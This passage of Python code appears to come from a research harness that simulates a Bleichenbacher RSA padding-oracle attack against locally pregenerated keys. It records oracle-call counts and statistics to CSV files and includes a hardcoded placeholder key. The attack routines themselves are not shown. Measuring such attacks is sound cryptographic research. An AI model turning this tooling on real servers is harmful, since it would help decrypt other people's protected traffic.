    metadata = np.array(
        [
            R,
            E,
            N,
            success_prob,
            mean,
            median,
            mean_2a,
            median_2a,
            mean_2b,
            median_2b,
            mean_2c,
            median_2c,
            mean_rb,
            median_rb,
            mean_t,
            median_t,
            mean_trimf,
            median_trimf,
        ]
    )
    labels = [
        "Experiment Round",
        "Experiment Number",
        "Number of Simulations",
        "Success Probability",
        "Mean Total",
        "Median Total",
        "Mean2a",
        "Median2a",
        "Mean2b",
        "Median2b",
        "Mean2c",
        "Median2c",
        "Mean Rounds 2b",
        "Median Rounds 2b",
        "Mean Trimmers",
        "Median Trimmers",
        "Mean Trimmer Interval Improvement",
        "Median Trimmer Interval Improvement",
    ]
    # create metadata file and store metadata there
    results_path_md = os.path.join(path, "metadata.csv")
    results_md = pd.DataFrame(metadata, index=labels)
    print(results_md)
    results_md.to_csv(results_path_md)
    # store data collected from all of the simulations for the experiment in a file
    results_path = os.path.join(path, "experimentalresults.csv")
    results = pd.DataFrame(
        {
            "i": index,
            "TotalOracleCalls": hist,
            "OracleCalls2a": hista,
            "OracleCalls2b": histb,
            "Oraclecalls_2c": histc,
            "Numberofintervalsbeforecallto2b": hist_intervals2b,
            "Roundsof2b": hist_roundsb,
            "OraclecallsTrimmers": histt,
            "IntervalImprovementTrimmers": histtrim_value,
            "(umin,t)": hist_utmin,
            "(umax,t)": hist_utmax,
        }
    )
    results.to_csv(results_path)
    # print end time of experiment
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)
    print("Experiment %d complete: %s " % (E, current_time))


if __name__ == "__main__":
    import pandas as pd
    otype = "FFT"
    keylength=2048
    attack = CapolBleichenAttack()
    nr_experiments = 10
    opt_params = attack.init_optimized(otype, keylength)
    if nr_experiments != 1:
        experiment_folder = "./experiments/"+ f"{otype}_{keylength}_{nr_experiments}_{int(time.time())}"
        os.mkdir(experiment_folder)
        bleichenbacher_simulations(0,0, N=nr_experiments, path=experiment_folder, **opt_params)
    else:
        i = 1
        # attack.init_process("FFT", keylength, SH, T, PT, I2C, TN, PM, t_slack_, bs_slack_)
        keys_path = "./keys/rsa-%d.csv" % keylength
        # we use a file of 1000 pregenerated keys and will use them in a round-robin fashion for the simulations
        keys = pd.read_csv(keys_path)
        keys = keys.drop(keys.columns[0], axis=1).to_numpy()
        key = keys[i % 1000]
        n,e = int(key[0]), int(key[1])
        rnkey = b'supersecretkey11'
        attack.init_process(**opt_params)
        result = attack.bleichenbacher_p(i, rnkey, n)
